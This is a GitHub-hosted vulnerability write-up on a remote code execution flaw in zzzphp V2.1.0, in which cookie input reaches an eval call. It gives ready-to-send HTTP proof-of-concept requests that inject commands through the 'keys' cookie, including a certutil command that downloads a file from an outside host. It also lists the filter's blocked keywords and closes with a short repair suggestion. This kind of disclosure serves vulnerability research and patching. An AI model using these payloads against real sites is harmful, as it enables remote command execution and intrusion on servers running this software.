
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FmetaStor%2FVuls%2Fblob%2Fmain%2Fzzzcms%2Fzzzphp%2520V2.1.0%2520RCE%2Fzzzphp%2520V2.1.0%2520RCE.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FmetaStor%2FVuls%2Fblob%2Fmain%2Fzzzcms%2Fzzzphp%2520V2.1.0%2520RCE%2Fzzzphp%2520V2.1.0%2520RCE.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=metaStor%2FVuls)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[metaStor](/metaStor)
/
**[Vuls](/metaStor/Vuls)**
Public

* [Notifications](/login?return_to=%2FmetaStor%2FVuls) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FmetaStor%2FVuls)
* [Star
   10](/login?return_to=%2FmetaStor%2FVuls)

* [Code](/metaStor/Vuls)
* [Issues
  1](/metaStor/Vuls/issues)
* [Pull requests
  0](/metaStor/Vuls/pulls)
* [Actions](/metaStor/Vuls/actions)
* [Projects
  0](/metaStor/Vuls/projects)
* [Security](/metaStor/Vuls/security)
* [Insights](/metaStor/Vuls/pulse)

Additional navigation options

* [Code](/metaStor/Vuls)
* [Issues](/metaStor/Vuls/issues)
* [Pull requests](/metaStor/Vuls/pulls)
* [Actions](/metaStor/Vuls/actions)
* [Projects](/metaStor/Vuls/projects)
* [Security](/metaStor/Vuls/security)
* [Insights](/metaStor/Vuls/pulse)

## Files

 main
## Breadcrumbs

1. [Vuls](/metaStor/Vuls/tree/main)
2. /[zzzcms](/metaStor/Vuls/tree/main/zzzcms)
3. /[zzzphp V2.1.0 RCE](/metaStor/Vuls/tree/main/zzzcms/zzzphp%20V2.1.0%20RCE)
/
# zzzphp V2.1.0 RCE.md

 Blame  Blame
## Latest commit

## History

[History](/metaStor/Vuls/commits/main/zzzcms/zzzphp%20V2.1.0%20RCE/zzzphp%20V2.1.0%20RCE.md)96 lines (77 loc) · 4.31 KB main
## Breadcrumbs

1. [Vuls](/metaStor/Vuls/tree/main)
2. /[zzzcms](/metaStor/Vuls/tree/main/zzzcms)
3. /[zzzphp V2.1.0 RCE](/metaStor/Vuls/tree/main/zzzcms/zzzphp%20V2.1.0%20RCE)
/
# zzzphp V2.1.0 RCE.md

Top
## File metadata and controls

* Preview
* Code
* Blame

96 lines (77 loc) · 4.31 KB[Raw](https://github.com/metaStor/Vuls/raw/refs/heads/main/zzzcms/zzzphp%20V2.1.0%20RCE/zzzphp%20V2.1.0%20RCE.md)
# zzzphp V2.1.0 RCE

## Vulnerability Analysis

Audit code download from: <http://115.29.55.18/zzzphp.zip>
[![img-1](/metaStor/Vuls/raw/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-1.png)](/metaStor/Vuls/blob/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-1.png)
[![img-2](/metaStor/Vuls/raw/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-2.png)](/metaStor/Vuls/blob/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-2.png)

Global search keywords: `eval`
[![img-3](/metaStor/Vuls/raw/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-3.png)](/metaStor/Vuls/blob/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-3.png)

Here you can see that the relationship of the controllable variables is: `$arr -> $ifstr -> $matcher -> $zcontent`
[![img-4](/metaStor/Vuls/raw/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-4.png)](/metaStor/Vuls/blob/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-4.png)

where `$zcontent` is a global variable:
[![img-5](/metaStor/Vuls/raw/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-5.png)](/metaStor/Vuls/blob/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-5.png)
After a bunch of processing above, it finally enters `$this->parserIfLabel($zcontent)` (where exists eval function)

Next, audit whether each function in front of `parserIfLabel()` can pass parameters to control `$zcontent`.

So search the `$zcontent` keyword globally in this file and find the `$this->parserSearch ( $zcontent )` function:
[![img-6](/metaStor/Vuls/raw/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-6.png)](/metaStor/Vuls/blob/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-6.png)

It means to replace `{zzz:keys}` in `$zcontent` with `$keywords`, trace back the value of `$keywords`, and find that it is just possible to pass parameters through cookies, and there is no filtering:
[![img-7](/metaStor/Vuls/raw/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-7.png)](/metaStor/Vuls/blob/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-7.png)

Continue to trace the trigger point of the `$this->parserSearch ( $zcontent )` function is called in `$this->parserlocation ( $zcontent )`, and the parserlocation function happens to be in the above functions:
[![img-8](/metaStor/Vuls/raw/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-8.png)](/metaStor/Vuls/blob/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-8.png)
[![img-9](/metaStor/Vuls/raw/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-9.png)](/metaStor/Vuls/blob/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-9.png)

To enter the parserSearch function, the premise is that the `$location` parameter is search, follow the `G()` function, and find that the parameters are obtained globally:
[![img-10](/metaStor/Vuls/raw/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-10.png)](/metaStor/Vuls/blob/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-10.png)

Then you can enter the vulnerability point function through `/index.php?location=search`, and then control the `Cookie: keys=xx` to control the input eval Malicious code.

Dynamic debugging found that `{zzz:keys}` is fixed in $zcontent after being processed by the previous function:
[![img-11](/metaStor/Vuls/raw/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-11.png)](/metaStor/Vuls/blob/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-11.png)

So directly control the `Cookie: keys=poc` can control $zcontent, and further control the content executed by eval:
Construct the poc request of the bullet calculator:

```
GET /zzzcms/?location=search HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookies: keys={if:=`calc`}{end if}
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

```

The debugging trace shows that the poc we constructed can be extracted after regular matching: `calc`
[![img-12](/metaStor/Vuls/raw/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-12.png)](/metaStor/Vuls/blob/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-12.png)

Then it will go through the filtering of the `danger_key()` function, and the keywords that are found to be filtered are:
`array('php','preg','server','chr','decode','html','md5','post','get','request','file','cookie','session','sql','mkdir','copy','fwrite','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','create','func','symlink','sleep','ascii','print','echo','base_','replace','_map','_dump','_array','regexp','select','dbpre','zzz_','{if','curl')`

But it does not affect the execution of the command
[![img-13](/metaStor/Vuls/raw/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-13.png)](/metaStor/Vuls/blob/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-13.png)

## Command Execution

```
GET /zzzcms/?location=search HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookies: keys={if:=`calc`}{end if}
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

```

[![img-14](/metaStor/Vuls/raw/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-14.png)](/metaStor/Vuls/blob/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-14.png)

## Remote Download

Since `danger_key()` filters the `curl` command, but it can use the `certutil` command for remote download operations in Windows:

```
GET /zzzcms/?location=search HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: keys={if:=`certutil -urlcache -split -f http://192.168.2.104:8080/test`}{end if}
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

```

[![img-15](/metaStor/Vuls/raw/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-15.png)](/metaStor/Vuls/blob/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-15.png)

## Repair suggestion

in `E:\xxx\zzzcms\inc\zzz_template.php Line 1895` Using `danger_key()` function pairs `$keywords = getform ('keys', 'cookie');` Filter
[![img-7](/metaStor/Vuls/raw/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-7.png)](/metaStor/Vuls/blob/main/zzzcms/zzzphp%20V2.1.0%20RCE/img/img-7.png)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

